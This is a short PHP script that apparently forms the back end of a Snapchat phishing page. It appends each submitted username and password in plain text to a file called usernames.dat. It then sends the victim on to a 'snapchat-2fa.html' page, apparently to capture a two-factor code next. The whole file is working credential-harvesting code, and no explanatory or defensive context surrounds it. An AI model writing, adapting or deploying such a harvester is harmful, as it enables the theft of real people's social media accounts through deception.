<?php
file_put_contents("usernames.dat", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: snapchat-2fa.html');
exit();
?>
